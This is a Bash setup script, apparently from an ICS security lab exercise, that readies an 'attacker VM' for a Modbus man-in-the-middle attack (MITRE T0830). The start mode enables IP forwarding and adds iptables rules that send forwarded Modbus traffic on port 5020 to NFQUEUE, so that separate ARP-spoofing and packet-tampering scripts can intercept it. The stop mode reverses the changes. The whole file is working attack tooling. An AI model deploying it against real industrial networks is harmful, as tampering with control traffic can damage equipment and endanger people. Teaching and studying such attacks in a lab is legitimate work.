#!/usr/bin/env bash
#
# Prepara (o limpia) la VM atacante para el MITM Modbus (T0830).
#   start -> activa IP forwarding y envia el trafico Modbus (puerto 5020) a NFQUEUE
#   stop  -> deshace los cambios
#
# Uso:
#   sudo ./setup_atacante.sh start
#   sudo ./setup_atacante.sh stop
#
set -euo pipefail

QUEUE_NUM=1
PORT=5020   # mismo puerto que usa la Parte A

if [[ "${1:-}" == "start" ]]; then
    echo "[setup] Activando IP forwarding..."
    sysctl -w net.ipv4.ip_forward=1

    echo "[setup] Enviando trafico Modbus (puerto ${PORT}) a NFQUEUE ${QUEUE_NUM}..."
    # Solo trafico REENVIADO (el que nos llega por el ARP spoofing).
    iptables -I FORWARD -p tcp --sport "${PORT}" -j NFQUEUE --queue-num "${QUEUE_NUM}"
    iptables -I FORWARD -p tcp --dport "${PORT}" -j NFQUEUE --queue-num "${QUEUE_NUM}"
    echo "[setup] Listo. Lanza arp_spoof.py y mitm_modbus.py."

elif [[ "${1:-}" == "stop" ]]; then
    echo "[setup] Eliminando reglas iptables..."
    iptables -D FORWARD -p tcp --sport "${PORT}" -j NFQUEUE --queue-num "${QUEUE_NUM}" 2>/dev/null || true
    iptables -D FORWARD -p tcp --dport "${PORT}" -j NFQUEUE --queue-num "${QUEUE_NUM}" 2>/dev/null || true
    echo "[setup] Desactivando IP forwarding..."
    sysctl -w net.ipv4.ip_forward=0
    echo "[setup] Limpio."

else
    echo "Uso: sudo $0 {start|stop}"
    exit 1
fi
